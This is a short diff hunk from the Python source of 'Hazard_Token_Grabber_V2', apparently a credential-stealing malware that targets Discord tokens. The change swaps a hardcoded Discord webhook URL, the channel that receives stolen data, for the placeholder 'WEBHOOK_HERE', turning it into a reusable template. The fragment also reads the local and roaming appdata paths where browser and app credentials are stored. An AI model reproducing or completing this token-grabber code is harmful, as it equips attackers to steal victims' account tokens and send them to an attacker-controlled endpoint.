@@ -6,7 +6,7 @@ from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/898188535025246268/L-x8JqpNtJP1SLYbBvjgbOGHsVOaj9hm6sPhikF4g9hwejLrh2CpB8SAwseLiViY05yT"
+        self.webhook = "WEBHOOK_HERE"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
